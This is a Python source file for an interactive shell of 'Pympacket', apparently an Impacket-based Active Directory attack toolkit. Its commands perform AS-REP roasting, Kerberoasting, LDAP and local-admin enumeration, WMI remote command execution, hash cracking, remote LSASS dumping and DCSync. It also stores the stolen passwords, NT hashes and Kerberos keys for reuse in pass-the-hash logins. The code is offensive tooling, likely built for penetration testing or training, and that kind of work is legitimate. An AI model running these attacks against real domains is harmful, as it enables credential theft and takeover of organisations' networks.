from pympacket.utils.asreproasting import asreproast
from pympacket.utils.kerberoasting import kerberoast
from pympacket.utils.raw_ldap_enum import ldap_enum
from pympacket.utils.check_admin_smb import check_admin_smb
from pympacket.utils.storage import Storage, load_storage, save_storage
from pympacket.utils.lateral import wmiexec
from pympacket.utils.bruteforce import bruteforce
from pympacket.utils.dump_lsass import dump_lsass
from pympacket.utils.dcsync import dcsync
from pympacket.models.common import Domain, Computer
from ldap3.core.exceptions import LDAPSocketOpenError
import argparse
import cmd
import os
import re


def ipv4_address(value):
    """Validate IPv4 address via a regex"""
    # Regular expression to match an IPv4 address (four octets)
    pattern = r"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    if not re.match(pattern, value):
        raise argparse.ArgumentTypeError(f"Invalid IPv4 address: {value}")
    return value

class ImpacketCLI(cmd.Cmd):
    prompt = '>> '
    intro = 'Welcome to Pympacket. Type "help" for available commands.' # change
    selected = None # Currently selected user
    storage: Storage

    def __init__(self):
        super().__init__()
        self.storage = load_storage() # Load saved information from storage file, if present

    def ldap_enum_output(self, ldap, conn, domain_base, domain, dc_ip):
        """Enumerate info from LDAP and formats output"""
        domain_info = Domain()
        domain_info.name = domain
        try:
            # Enumerate Domain SID
            domain_sid = ldap.domain_sid(conn, domain_base)
            print(f"Domain SID ({domain}): {domain_sid}\n")
            domain_info.sid = domain_sid

            # Enumerate Domain Admins
            domain_admins = ldap.group_member(conn, domain_base, "Domain Admins")
            print("Members of 'Domain Admins':")
            for da in domain_admins:
                print(da)
            print("")

            domain_info.domain_admins = domain_admins

            # Enumerate Domain Users
            domain_users = ldap.enum_users(conn, domain_base)
            print("Domain User Accounts:")
            for user in domain_users:
                print("------------------------------------------")
                print(f"RID: {user['rid']}")
                print(f"Username: {user['username']}")
                print(f"Description: {user['description']}")
                if len(user['memberOf']):
                    groups = ""
                    for group in user['memberOf']:
                        groups += f"{group}, "
                    groups = groups[:-2]
                print(f"Groups: {groups}")
                print(f"AdminCount: {user['adminCount']}")
            print("------------------------------------------\n")

            # Enumerate Domain Computers
            computer_objects = []
            domain_computers = ldap.enum_computers(conn, domain_base, dc_ip)
            print("Domain Computers:")
            for computer in domain_computers:
                current_computer = Computer()
                current_computer.name = computer['name']
                current_computer.dns_name = computer['dns_hostname']
                current_computer.ip_address = computer['ip_address']
                current_computer.dc = computer['is_dc']
                if computer['is_dc']:
                    domain_info.dc.append(computer['ip_address'])
                computer_objects.append(current_computer)
                print("------------------------------------------")
                print(f"Computer Name: {computer['name']}")
                print(f"DNS Hostname: {computer['dns_hostname']}")
                print(f"IP Address: {computer['ip_address']}")
                print(f"Domain Controller: {computer['is_dc']}")
            print("------------------------------------------\n")
            domain_info.domain_computers = computer_objects
            return domain_info
        except LDAPSocketOpenError as e:
            if str(e).find("invalid server address") >= 0:
                print("Invalid Domain Name.\n")
            else:
                print("Unable to query the LDAP Server for informations.\n")
            return None

    def save_user(self, users):
        """Saves provided User objects to storage"""
        for user in users:
            found = False
            for saved_user in self.storage.users:
                if user.username == saved_user.username: # If the user is already saved
                    found = True
                    if saved_user.nthash == None and user.nthash != None: # Save nthash if it's not already present
                        saved_user.nthash = user.nthash
                    if saved_user.aes256 == None and user.aes256 != None: # Save aes256 key if it's not already present
                        saved_user.aes256 = user.aes256
                    # Save only on type of kerberos hash (asrep/tgs) only if the already saved user doesn't have any
                    if len(saved_user.krb_hash) == 0 and len(user.krb_hash) > 0:
                        (saved_user.krb_hash).append(user.krb_hash)
                    save_storage(self.storage)
            if not found: # If the user is not already in the storage, just save it
                self.storage.users.append(user)
                save_storage(self.storage)

    def save_domain(self, domain_info):
        """Saves domain information to storage"""
        if self.storage.domain_info != None: # If domain data is already present in storage
            if domain_info.sid == (self.storage.domain_info).sid: # If the domain is the same, just update the saved information
                self.storage.domain_info = domain_info
                save_storage(self.storage)
            else: # If the domain is different the user will decide to skip saving or clearing the entire storage to save the new domain
                print("\nThere is already a different domain saved in memory,")
                print("to save the new domain you need to wipe all the informations currently stored.")
                choice = ''
                while (choice != '1' and choice != '2'):
                    choice = input("Type (1) to save the new domain and wipe the storage, (2) otherwise: ")
                    if choice == '1':
                        print("Wiping the storage and saving the new domain...\n")
                        self.storage = Storage()
                        save_storage(self.storage)
                        self.storage.domain_info = domain_info
                        save_storage(self.storage)
                    elif choice == '2':
                        print("Operation aborted...\n")
                    else:
                        print("Invalid choice.")
        else: # If no domain data is already present, just save the data in storage
            self.storage.domain_info = domain_info
            save_storage(self.storage)

    def do_select_user(self, args):
        """Select a saved user as active, to use its stored credentials in commands that require authentication."""
        parser = argparse.ArgumentParser(prog='select_user', description='Select a stored user to use his credentials.')
        parser.add_argument('-u', '--user', type=str, required=True, help='The username to select.')
        try:
            args = parser.parse_args(args.split())
        except SystemExit:
            return
        found = False
        for user in self.storage.users:
            if args.user == user.username:
                found = True
                # Can only select users that have credentials associated to them (password/nthash)
                if user.password != None or user.nthash != None:
                    self.selected = user
                    self.prompt = f"({user.username}) >> "
                else:
                    print("\nA valid user is found in storage, but no credentials are attached to them.\n")
        
        if not found:
            print("\nNo user is found in storage with that exact username.\n")

    def do_deselect_user(self, args):
        """Deselect the active user to return in a neutral state."""
        self.selected = None
        self.prompt = ">> "

    def do_enum(self, args):
        """Perform various types of enumeration against the Domain."""
        parser = argparse.ArgumentParser(prog='enum', description='Perform various types of enumeration against the Domain.')
        parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
        parser.add_argument('-dc-ip', type=ipv4_address, required=True, help='The ip address of the domain controller.')
        group = parser.add_argument_group()
        group.add_argument('-u', '--username', type=str, required=False, help='The username to use.')
        group.add_argument('-p', '--password', type=str, required=False, help='The password to use.')
        group.add_argument('-nthash', type=str, required=False, help='The NT hash of the user.')
        group.add_argument('-w', '--wordlist', type=str, required=False, help='The wordlist containing usernames to test.')
        group.add_argument('-t', '--type', type=str, choices=['all', 'asrep', 'kerberoast', 'ldap', 'admin'] , required=False, default='all', help='What type of enumeration to perform.')

        try:
            args = parser.parse_args(args.split())
        except SystemExit:
            return

        if (args.username and (args.password or args.nthash)) or self.selected != None: # Authenticated enumeration
            if args.type == 'all' or args.type == 'ldap':
                ldap = ldap_enum()
                if self.selected == None:
                    if args.nthash == None:
                        conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.password, domain=args.domain, pth=False)
                    else:
                        conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.nthash, domain=args.domain, pth=True)
                else:
                    if self.selected.password != None:
                        conn, domain_base = ldap.login(target=args.dc_ip, user=self.selected.username, password=self.selected.password, domain=args.domain, pth=False)
                    else:
                        conn, domain_base = ldap.login(target=args.dc_ip, user=self.selected.username, password=self.selected.nthash, domain=args.domain, pth=True)

                if conn != None:
                    domain_info = self.ldap_enum_output(ldap, conn, domain_base, args.domain, args.dc_ip)
                    if domain_info != None:
                        self.save_domain(domain_info)

            if args.type == 'all' or args.type == 'admin': # Enumerate Administrative Privilege
                ldap = ldap_enum()
                if self.selected == None:
                    if args.nthash == None:
                        conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.password, domain=args.domain, pth=False)
                    else:
                        conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.nthash, domain=args.domain, pth=True)
                else:
                    if self.selected.password != None:
                        conn, domain_base = ldap.login(target=args.dc_ip, user=self.selected.username, password=self.selected.password, domain=args.domain, pth=False)
                    else:
                        conn, domain_base = ldap.login(target=args.dc_ip, user=self.selected.username, password=self.selected.nthash, domain=args.domain, pth=True)
                
                if conn != None:
                    try:
                        domain_computers = ldap.enum_computers(conn, domain_base, args.dc_ip) # Retrieve domain computers
                    except LDAPSocketOpenError as e:
                        if str(e).find("invalid server address") >= 0:
                            print("Invalid Domain Name.\n")
                        else:
                            print("Unable to query the LDAP Server for informations.\n")
                        domain_computers = None
                    
                    if domain_computers != None:
                        print("Checking if the current user is a Local Administrator on a Domain Computer:")
                        admin_on = []
                        for computer in domain_computers:
                            if computer['ip_address']: # Only test Domain Computers with a saved ip address
                                if self.selected == None:
                                    if args.nthash == None:
                                        result = check_admin_smb(target=computer['ip_address'], username=args.username, domain=args.domain, password=args.password)
                                    else:
                                        result = check_admin_smb(target=computer['ip_address'], username=args.username, domain=args.domain, nthash=args.nthash)
                                else:
                                    if self.selected.password != None:
                                        result = check_admin_smb(target=computer['ip_address'], username=self.selected.username, domain=args.domain, password=self.selected.password)
                                    else:
                                        result = check_admin_smb(target=computer['ip_address'], username=self.selected.username, domain=args.domain, nthash=self.selected.nthash)
                                if result:
                                    admin_on.append(computer['name'])
                    
                        if len(admin_on):
                            for pc in admin_on:
                                print(pc)
                        else:
                            print("The current user does not have Local Administrator privileges on any Domain Computer.")
                        print("")

            if args.type == 'all' or args.type == 'asrep':
                if self.selected == None:
                    asrep_out = asreproast(dc_ip=args.dc_ip, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
                else:
                    if self.selected.password != None:
                        asrep_out = asreproast(dc_ip=args.dc_ip, username=self.selected.username, password=self.selected.password, domain=args.domain)
                    else:
                        asrep_out = asreproast(dc_ip=args.dc_ip, username=self.selected.username, nthash=self.selected.nthash, domain=args.domain)
                        
                if asrep_out != None:
                    if len(asrep_out):
                        print("ASREP-Roasted the following users and stored their asrep hash for future bruteforce:")
                        for asrep in asrep_out:
                            print(asrep.username)
                            self.save_user(asrep_out)
                        print("")
                    else:
                        print("There are no users with 'PREAUTH_NOTREQ' on the target Domain.\n")

            if args.type == 'all' or args.type == 'kerberoast':
                if self.selected == None:
                    tgs_out = kerberoast(username=args.username, password=args.password, nthash=args.nthash, dc_ip=args.dc_ip, domain=args.domain)
                else:
                    if self.selected.password != None:
                        tgs_out = kerberoast(dc_ip=args.dc_ip, username=self.selected.username, password=self.selected.password, domain=args.domain)
                    else:
                        tgs_out = kerberoast(dc_ip=args.dc_ip, username=self.selected.username, nthash=self.selected.nthash, domain=args.domain)                
                if tgs_out != None:
                    if len(tgs_out):
                        print("Kerberoasted the following users and stored their TGS for future bruteforce:")
                        for tgs in tgs_out:
                            print(tgs.username)
                            self.save_user(tgs_out)
                        print("")
                    else:
                        print("There are no Service Accounts on the target Domain.\n")
        elif (args.wordlist): # Unauthenticated enumeration
            if args.type == 'all' or args.type == 'asrep':
                asrep_out = asreproast(dc_ip=args.dc_ip, domain=args.domain, usersfile=args.wordlist)
                if asrep_out != None:
                    if len(asrep_out):
                        print("ASREP-Roasted the following users and stored their asrep hash for future bruteforce:")
                        for asrep in asrep_out:
                            print(asrep.username)
                            self.save_user(asrep_out)
                        print("")
                    else:
                        print("There are no users with 'PREAUTH_NOTREQ' on the target Domain.\n")
                
            if args.type == 'all' or args.type == 'ldap':
                ldap = ldap_enum()
                conn, domain_base = ldap.login(target=args.dc_ip, domain=args.domain)

                if conn != None:
                    domain_info = self.ldap_enum_output(ldap, conn, domain_base, args.domain, args.dc_ip)
                    if domain_info != None:
                        self.save_domain(domain_info)
                
            if args.type == 'kerberoast' or args.type == 'admin':
                print("You can't perform kerberoasting or check for Local Admin privileges without a valid set of user credentials.\n")
                return
        else:
            print("You must specify an user wordlist to perform unauthenticated enumeration.\n")
            return

    def do_exec(self, args):
        """Execute the provided command on a target computer through WMI, requires local administrative privileges."""
        parser = argparse.ArgumentParser(prog='exec', description='Execute a command on a system via wmiexec, if enough privileges are provided.')
        parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
        parser.add_argument('-t', '--target', type=ipv4_address, required=True, help='The ip address of the target system.')
        parser.add_argument('-c', '--cmd', type=str, required=True, help='The command to execute.')
        group = parser.add_argument_group()
        group.add_argument('-u', '--username', type=str, required=False, help='The username to use.')
        group.add_argument('-p', '--password', type=str, required=False, default='', help='The password to use.')
        group.add_argument('-nthash', type=str, required=False, help='The NT hash of the user.')
        group.add_argument('-s', '--shell', type=str, choices=['cmd', 'powershell'] , required=False, default='cmd', help='What kind of shell to spawn.')
        try:
            args = parser.parse_args(args.split())
        except SystemExit:
            return
        if self.selected == None:
            wmiexec(target=args.target, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain, cmd=args.cmd, shell_type=args.shell)
        else:
            wmiexec(target=args.target, username=self.selected.username, password=self.selected.password, nthash=self.selected.nthash, domain=args.domain, cmd=args.cmd, shell_type=args.shell)

    def do_bruteforce(self, args):
        """Performs a wordlist bruteforce against kerberos hashes stored in memory."""
        parser = argparse.ArgumentParser(prog='bruteforce', description='Performs a wordlist bruteforce against hashes stored in memory.')
        parser.add_argument('-w', '--wordlist', type=str, required=True, help='The wordlist containing the passwords to test.')
        parser.add_argument('-t', '--type', type=str, choices=['all', 'asrep', 'tgs'], required=False, default='all', help='The type of hashes to crack.')
        try:
            args = parser.parse_args(args.split())
        except SystemExit:
            return
        cracked_tgs = []
        cracked_asrep = []
        for user in self.storage.users:
            if user.password == None: # Only perform the bruteforce if we don't have valid credentials for the user
                if len(user.krb_hash):
                    for hash in user.krb_hash:
                        if hash.type == 'asrep' and (args.type == 'all' or args.type == 'asrep'):
                            password = bruteforce(args.wordlist, hash)
                            if password:
                                user.password = password
                                save_storage(self.storage)
                                cracked_asrep.append(user.username)
                        if hash.type == 'tgs' and (args.type == 'all' or args.type == 'tgs'):
                            password = bruteforce(args.wordlist, hash)
                            if password:
                                user.password = password
                                save_storage(self.storage)
                                cracked_tgs.append(user.username)
        if len(cracked_asrep):
            print("Cracked the ASREP Hashes for the following users:")
            for user in cracked_asrep:
                print(user)
            print("")
        else:
            print("No ASREP Hashes were able to be cracked.\n")

        if len(cracked_tgs):
            print("Cracked the TGS Hashes for the following users:")
            for user in cracked_tgs:
                print(user)
            print("")
        else:
            print("No TGS Hashes were able to be cracked.\n")

    def do_list_users(self, args):
        """List saved Domain Users."""
        parser = argparse.ArgumentParser(prog='list_users', description='List saved users.')
        parser.add_argument('--hash', action='store_true', required=False, default=False, help='Display stored asrep/tgs hashes in cleartext.')
        parser.add_argument('--cleartext', action='store_true', required=False, default=False, help='Display stored password/ntlm/aes256 credentials in cleartext.')
        parser.add_argument('-f', '--filter', type=str, required=False, help='Username to filter.')
        try:
            args = parser.parse_args(args.split())
        except SystemExit:
            return
        if len(self.storage.users):
            print("\nCurrently saved Domain Users:")
            for user in self.storage.users:
                if args.filter != None and args.filter not in user.username: # When a filter is specified, only print users that contains the filter in their usernames
                    continue
                print(f"Username: {user.username}")

                if user.password != None:
                    if args.cleartext:
                        print(f"Password: {user.password}")
                    else:
                        print(f"Password: Saved")
                else:
                    print("Password: Not saved")

                if user.nthash != None:
                    if args.cleartext:
                        print(f"NTLM Hash: {user.nthash}")
                    else:
                        print(f"NTLM Hash: Saved")
                else:
                    print("NTLM Hash: Not saved")

                if user.aes256 != None:
                    if args.cleartext:
                        print(f"AES256 Key: {user.aes256}")
                    else:
                        print(f"AES256 Key: Saved")
                else:
                    print("AES256 Key: Not saved")
                
                if len(user.krb_hash):
                    if args.hash:
                        print("Kerberos Hashes:")
                        for hash in user.krb_hash:
                            print(f"{hash.type} hash: {hash.value}")
                    else:
                        hash_types = "("
                        for hashes in user.krb_hash:
                            hash_types += f"{hashes.type}, "
                        hash_types = hash_types[:-2]
                        hash_types += ")"
                        print(f"Kerberos Hash: Saved {hash_types}")
                else:
                    print("Kerberos Hash: Not saved")
                print("")
        else:
            print('No users stored in memory.\n')

    def do_domain_info(self, args):
        """Retrieve saved Domain information."""
        parser = argparse.ArgumentParser(prog='domain_info', description='Get saved domain information.')
        parser.add_argument('--computers', action='store_true', required=False, default=False, help='Display detailed computer information.')
        
        try:
            args = parser.parse_args(args.split())
        except SystemExit:
            return

        if self.storage.domain_info != None:
            print("Domain Information:")
            print(f"Name: {self.storage.domain_info.name}")
            print(f"SID: {self.storage.domain_info.sid}")

            dcs = ""
            for dc in self.storage.domain_info.dc:
                dcs += f"{dc}, "
            dcs = dcs[:-2]
            print(f"Domain Controllers: {dcs}")

            if len(self.storage.domain_info.domain_admins):
                das = ""
                for da in self.storage.domain_info.domain_admins:
                    das += f"{da}, "
                das = das[:-2]
                print(f"Domain Admins: {das}")
            
            if args.computers:
                print("\nDomain Computers:")
                for computer in self.storage.domain_info.domain_computers:
                    print(f"Name: {computer.name}")
                    print(f"DNS Hostname: {computer.dns_name}")
                    print(f"IP Address: {computer.ip_address}")
                    print(f"Domain Controller: {computer.dc}\n")
            else:
                print(f"Domain Computers: {len(self.storage.domain_info.domain_computers)}")
            print("")
        else:
            print("No Domain data stored in memory.\n")

    def do_lsass_dump(self, args):
        """Perform a dump of the local lsass process and extracts saved credentials."""
        parser = argparse.ArgumentParser(prog='lsass_dump', description='Perform a dump of the local lsass process and extracts saved credentials, if enough privileges are provided.')
        parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
        parser.add_argument('-t', '--target', type=ipv4_address, required=True, help='The ip address of the target system.')
        group = parser.add_argument_group()
        group.add_argument('-u', '--username', type=str, required=False, default='', help='The username to use.')
        group.add_argument('-p', '--password', type=str, required=False, default='', help='The password to use.')
        group.add_argument('-nthash', type=str, required=False, default='', help='The NT hash of the user.')

        try:
            args = parser.parse_args(args.split())
        except SystemExit:
            return

        if self.selected == None:
            user_creds = dump_lsass(target=args.target, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
        else:
            user_creds = dump_lsass(target=args.target, username=self.selected.username, password=self.selected.password, nthash=self.selected.nthash, domain=args.domain)                 

        if user_creds != None:
            if len(user_creds):
                print("\nThe following users were extracted from the lsass dump:")
                for user in user_creds:
                    print(user.username)
                print("")
                self.save_user(user_creds)
            else:
                print("No user accounts were extracted from the lsass dump.\n")

    def do_dcsync(self, args):
        """Perform a DCSync against a Domain Controller and retrieves Domain User credentials from the ntds.dit database."""
        parser = argparse.ArgumentParser(prog='dcsync', description='Perform a DCSync against a Domain Controller and retrieves Domain User credentials from the ntds.dit database, if enough privileges are provided.')
        parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
        parser.add_argument('-t', '--target', type=ipv4_address, required=True, help='The ip address of the domain controller.')
        group = parser.add_argument_group()
        group.add_argument('-u', '--username', type=str, required=False, default='', help='The username to use.')
        group.add_argument('-p', '--password', type=str, required=False, default='', help='The password to use.')
        group.add_argument('-nthash', type=str, required=False, default='', help='The NT hash of the user.')

        try:
            args = parser.parse_args(args.split())
        except SystemExit:
            return

        if self.selected == None:
            user_creds = dcsync(target=args.target, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
        else:
            user_creds = dcsync(target=args.target, username=self.selected.username, password=self.selected.password, nthash=self.selected.nthash, domain=args.domain)                 

        if user_creds != None:
            if len(user_creds):
                print("\nThe following users were extracted from the dcsync:")
                for user in user_creds:
                    print(user.username)
                print("")
                self.save_user(user_creds)
            else:
                print("No user accounts were extracted from the dcsync.\n")

    def do_clear(self, args):
        """Clear the CLI."""
        # For Windows
        if os.name == 'nt':
            os.system('cls')
        # For Linux and macOS
        else:
            os.system('clear')

    def do_forget(self, args):
        """Clears the saved storage and memory."""
        self.storage = Storage()
        save_storage(self.storage)

    def do_quit(self, args):
        """Exit the CLI."""
        save_storage(self.storage) # Save storage on disk before exiting
        return True